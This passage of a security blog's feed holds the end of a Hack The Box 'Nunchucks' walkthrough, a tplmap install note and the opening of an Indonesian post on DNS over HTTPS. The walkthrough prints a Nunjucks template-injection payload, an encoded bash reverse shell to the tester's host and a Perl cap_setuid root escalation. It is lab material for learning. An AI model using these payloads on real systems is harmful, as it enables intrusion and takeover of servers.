<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
<span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
<span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
<span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
<span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
<span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
<span class="s2">&#34;created_at&#34;</span>:1633378615869
<span class="s2">&#34;restart_time&#34;</span>:2
<span class="s2">&#34;unstable_restarts&#34;</span>:0
<span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
<span class="s2">&#34;versioning&#34;</span>:null
<span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
<span class="s2">&#34;pm_id&#34;</span>:6
<span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
</code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ cat loot/user.txt
bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h3 id="shell-as-david">Shell as david</h3>
<h4 id="tpl-shell">TPL shell</h4>
<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need command execution!</p>
<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:

  GET parameter: email
  Engine: Nunjucks
  Injection: <span class="o">{{</span>*<span class="o">}}</span>
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Shell <span class="nb">command</span> execution: no
   Bind and reverse shell: no
   File write: ok
   File read: ok
   Code evaluation: ok, javascript code

<span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
<span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
</code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 

<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 

<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
total 0<span class="se">\n</span>
</code></pre></div><p>I definitely can execute OS command 😮!</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I tried to inject my SSH pubkey, but I got asked for a password. Therefore, I will use a bash reverse shell encoded in base64.</p>
<p>The payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
</code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 

<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ nc -nvlp <span class="m">53</span>                                                      
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ id  
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
david@nunchucks:/var/www/store.nunchucks$
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ls -la
total <span class="m">16</span>
drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
david@nunchucks:/opt$ ls web_backups/ -l
total <span class="m">14944</span>
-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
</code></pre></div><p>The script code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="ch">#!/usr/bin/perl</span>
<span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
<span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 

<span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
<span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>

<span class="k">sub</span> <span class="nf">printlog</span>
<span class="p">{</span>
    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">sub</span> <span class="nf">archive</span>
<span class="p">{</span>
    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
<span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
<span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
<span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
<span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
<span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
</code></pre></div><p>When I run it, I found that I didn&rsquo;t fail in the first if statement, which checks for root priv (I guess).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ./backup.pl 
<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
david@nunchucks:/opt$ 
</code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
/usr/bin/perl <span class="o">=</span> cap_setuid+ep
</code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
root
</code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ cat .0mochi.pl 
<span class="c1">#!/usr/bin/perl</span>
use strict<span class="p">;</span>
use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
use DBI<span class="p">;</span>
use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 

system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
david@nunchucks:/tmp$ chmod +x .0mochi.pl 
</code></pre></div><p>And it worked!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
$ nc -nvlp <span class="m">53</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
root@nunchucks:/tmp# id
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
</p>
<p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@nunchucks:/tmp# cat /root/root.txt
cat /root/root.txt
1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Tplmap Install</title>
      <link>https://fahmifj.github.io/blog/tplmap-install/</link>
      <pubDate>Fri, 05 Nov 2021 20:40:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/tplmap-install/</guid>
      <description>Python pip so weirrd</description>
      <content:encoded><![CDATA[<p>This is quick note to get tplmap working again!</p>
<p>Previously on <a href="https://fahmifj.github.io/hackthebox/doctor/">HTB: Doctor</a>, this tool was working fine with python2, but when I tried to use it again, it threw these error messages.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «192.168.1.55» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$ python tplmap.py 
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">&#34;/opt/tplmap-venv/tplmap/./tplmap.py&#34;</span>, line 2, in &lt;module&gt;
    from utils import cliparser
  File <span class="s2">&#34;/opt/tplmap-venv/tplmap/utils/cliparser.py&#34;</span>, line 163, in &lt;module&gt;
    parser.formatter.format_option_strings <span class="o">=</span> type<span class="o">(</span>parser.formatter.format_option_strings<span class="o">)(</span>_, parser, type<span class="o">(</span>parser<span class="o">))</span>
TypeError: method expected <span class="m">2</span> arguments, got <span class="m">3</span>
</code></pre></div><p>Here&rsquo;s how I resolve it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python2 -m pip install --upgrade setuptools
$ python2 -m pip install virtualenv 
$ git clone https://github.com/epinna/tplmap.git
$ <span class="nb">cd</span> ./tplmap/
$ python2 -m virtualenv tplmap-venv
$ <span class="nb">source</span> ./tplmap-venv/bin/activate
<span class="o">(</span>tplmap-venv<span class="o">)</span> $ python2 -m pip install -r requirements.txt 
</code></pre></div><p>All the requirements should be listed now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → $ python2 -m pip list                                                      
--<span class="o">[</span>snip annoying deprecated message<span class="o">]</span>--
Package    Version
---------- ----------
certifi    2018.10.15
chardet    3.0.4
idna       2.8
pip        20.3.4
PyYAML     5.1.2
requests   2.22.0
setuptools 44.1.1
urllib3    1.24.1
wheel      0.37.0
</code></pre></div><p>It&rsquo;s working fine now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «192.168.1.55» git:<span class="o">(</span>master<span class="o">)</span> 
$ python2 tplmap.py 
<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

Usage: python tplmap.py <span class="o">[</span>options<span class="o">]</span>

tplmap.py: error: URL is required. Run with -h <span class="k">for</span> help.
</code></pre></div><p>I&rsquo;m not sure about this, but on my other Kali, these commands (without venv) could get tplmap working again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ python2 install --upgrade setuptools
$ python2 -m pip install -r requirements.txt 
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Hosts file, DNS over HTTPS dan SSH SOCKS Proxy [ID]</title>
      <link>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</link>
      <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</guid>
      <description>Can we use these to bypass DNS filters and conceal ourselves from ISPs? Let&amp;#39;s find out!</description>
      <content:encoded><![CDATA[<p>Saat ini sebagian besar browser-browser populer sudah memiliki fitur <a href="https://developers.cloudflare.com/1.1.1.1/encrypted-dns">DNS over HTTPS (DoH)</a>. Tapi meskipun begitu, ternyata masih banyak yang belum tau tentang adanya fitur ini.</p>
<figure>
    <img src="imgs/image-20211104224726768.png"
         alt="Settingan DoH pada Chrome dan Firefox"/> <figcaption>
            <p>Settingan DoH pada Chrome dan Firefox
            </p>
        </figcaption>
</figure>

<p><em><strong>Loh tau dari mana?</strong></em></p>
<p><em>Flashback</em> sedikit, ada beberapa teman yang setiap kali mau mengakses reddit atau web streaming anime <del>i</del>legal, mereka harus pakai VPN untuk bypass blokirannya ISP. Karena VPN-nya ini gratisan (baca: dipakai berjamaah dan di limit), sudah pasti jatuhnya lemot.</p>
<p>Setelah mereka tau soal fitur DoH, salah satunya memberi respon berikut:</p>
<figure>
    <img src="imgs/image-20211103210137432.png"
         alt="Sebuah testimoni"/> <figcaption>
            <p>Sebuah testimoni
            </p>
        </figcaption>
</figure>

<p>Agak risih juga sih ISP di negara ini sukanya main bloc-bloc-an.</p>
<p>Nah di postingan ini saya akan coba bahas kenapa DoH bisa dipakai untuk mem-<em>bypass</em> website yang diblokir. Saya juga bakal cari tau apakah DoH dan SSH SOCKS Proxy sudah cukup untuk menyembunyikan kita dari ISP.</p>
<h2 id="how-do-isps-block-websites">How do ISPs block websites?</h2>
<p>Normalnya ketika kita mengakses sebuah situs, misal <code>www.reddit.com</code>, komputer kita akan mengirimkan sebuah kueri DNS ke sebuah DNS server untuk menanyakan alamat IP dari domain <code>www.reddit.com</code> agar halaman situs tersebut bisa dimuat kemudian. Kueri DNS ini biasanya diarahkan ke DNS server milik ISP/operator seluler yang kamu pakai.</p>
<p>Nah ketika kita mengakses situs yang kebetulan terdaftar di <em>blacklist</em> DNS server ISP, maka DNS server tersebut akan memberikan alamat IP palsu yang merupakan halaman blokir milik si ISP seperti merconsuar, ipo, dll.</p>
<p>Kita bisa liat alur-nya secara detail dengan WireShark, tetapi agar lebih simple, kita juga bisa menggunakan <code>tracert</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ tracert -4 -d -h <span class="m">5</span> www.reddit.com

Tracing route to blockpage.****.id <span class="o">[</span>***.215.197.131<span class="o">]</span> 
over a maximum of <span class="m">5</span> hops:

  <span class="m">1</span>     <span class="m">2</span> ms     <span class="m">2</span> ms     <span class="m">2</span> ms  192.168.1.1 
  <span class="m">2</span>     *        *        *     Request timed out.
  <span class="m">3</span>    <span class="m">38</span> ms    <span class="m">32</span> ms    <span class="m">24</span> ms  10.***.44.1 
  <span class="m">4</span>    <span class="m">26</span> ms    <span class="m">31</span> ms    <span class="m">22</span> ms  ***.215.248.78 
  <span class="m">5</span>    <span class="m">33</span> ms    <span class="m">25</span> ms    <span class="m">27</span> ms  ***.215.248.82 

Trace complete.
</code></pre></div><blockquote>
<p>Di hop kedua saya kurang yakin apakah modem ADSL tidak punya/punya hop count seperti router yang akhirnya tracert menampilkan timeout, atau memang pure timeout.</p>
</blockquote>
<p>Berdasarkan hasil <code>tracert</code> diatas, <code>www.reddit.com</code> di <em>resolve</em> ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code> dan kita bisa validasi ini menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox Dig</a> yang hasilnya:</p>
<figure>
    <img src="imgs/image-20211104095424598.png"
         alt="Hasil dig www.reddit.com"/> <figcaption>
            <p>Hasil dig <a href="http://www.reddit.com">www.reddit.com</a>
            </p>
        </figcaption>
</figure>

<p>Ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>***.215.197.131</code>!</p>
<p>Yah komputernya kena penipuan :/</p>
<p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
<figure>
    <img src="imgs/image-20211103163418666.png"
         alt="Ilustrasi(nya)"/> <figcaption>
            <p>Ilustrasi(nya)
            </p>
        </figcaption>
</figure>

<p><em><strong>Darimana saya tau 10.***.44.1 itu router ISP?</strong></em></p>
<p>Nope, saya gak tau itu router atau bukan, tapi perangkat ini punya port SSH dan SNMP, jadi kemungkinan perangkat ini di monitor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ nc -vn 10.***.44.1 <span class="m">22</span>
Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
Ncat: Connected to 10.***.44.1:22.
SSH-2.0-OpenSSH_7.5
$ nc -u -vn 10.***.44.1 <span class="m">161</span>
Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
Ncat: Connected to 10.***.44.1:161
</code></pre></div><p><em><strong>Tapi kan HTTPS?</strong></em></p>
<p>Enkripsi HTTPS/TLS itu ada di bagian kontennya<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, sedangkan paket-paket DNS kueri yang dikirimkan untuk me-<em>resolve</em> nama domain ke sebuah alamat IP tidak masuk ke dalam enkripsi tersebut.</p>
<blockquote>
<p>Kueri DNS itu mendahului trafik HTTP/S</p>
</blockquote>
<p>Jadi misalnya ketika kita melakukan login di suatu HTTPS website, ISP gak akan tau username dan password yang kita masukkan, bentukan login page tersebut, dan bahkan sampai ke <em>endpoint</em> URLnya (<code>website.com/api/v1/login/?username=admin&amp;password=admin123</code>).</p>
<figure>
    <img src="imgs/image-20211104092043412.png"
         alt="Contoh konten yang dienkripsi"/> <figcaption>
            <p>Contoh konten yang dienkripsi
            </p>
        </figcaption>
</figure>

<p>Dengan kata lain, ISP hanya tau tujuan kita mau kemana, tapi dia (seharusnya) gak bisa lihat apa yang kita lakukan di tempat tujuan itu.</p>
<p>Sampai disini, tentunya kita bisa menyimpulkan sendiri kenapa DoH bisa membuat komputer kita menghindari &ldquo;penipuan&rdquo; yang dilakukan DNS server ISP tersebut.</p>
<p>Yap, karena kueri DNSnya dibungkus HTTPS.</p>
<p>Awalnya DNS kueri dikirimkan tanpa enkripsi ke DNS server ISP melalui port 53, tapi dengan DoH, DNS kueri ini sekarang di <em>deliver</em> melalui HTTPS ke <em>endpoint</em> DoH yang juga HTTPS, misalnya Cloudflare: <a href="https://cloudflare-dns.com/dns-query">https://cloudflare-dns.com/dns-query</a>.</p>
<p><em><strong>Terus cloudflare-dns.com di resolve siapa?</strong></em></p>
<p>DNSnya ISP wkwkw. Yah ketauan kan pakai DoH.</p>
<p>Tenang, kita bisa pakai versi IP 1^4-nya.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ curl -H <span class="s1">&#39;accept: application/dns-json&#39;</span> <span class="s2">&#34;https://1.1.1.1/dns-query?name=www.reddit.com&#34;</span>
<span class="o">{</span><span class="s2">&#34;Status&#34;</span>:0,<span class="s2">&#34;TC&#34;</span>:false,<span class="s2">&#34;RD&#34;</span>:true,<span class="s2">&#34;RA&#34;</span>:true,<span class="s2">&#34;AD&#34;</span>:false,<span class="s2">&#34;CD&#34;</span>:false,<span class="s2">&#34;Question&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:1<span class="o">}]</span>,<span class="s2">&#34;Answer&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:5,<span class="s2">&#34;TTL&#34;</span>:288,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net.&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.65.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.129.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.193.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.1.140&#34;</span><span class="o">}]}</span>
</code></pre></div><h2 id="thou-shalt-bypass">Thou Shalt (By)Pass</h2>
<h3 id="hosts-file-the-primivite-dns">Hosts file: The Primivite DNS</h3>
<p>Tanpa DoH, sebenarnya kita bisa menghindari &ldquo;penipuan&rdquo; alamat IP tersebut di level cache.</p>
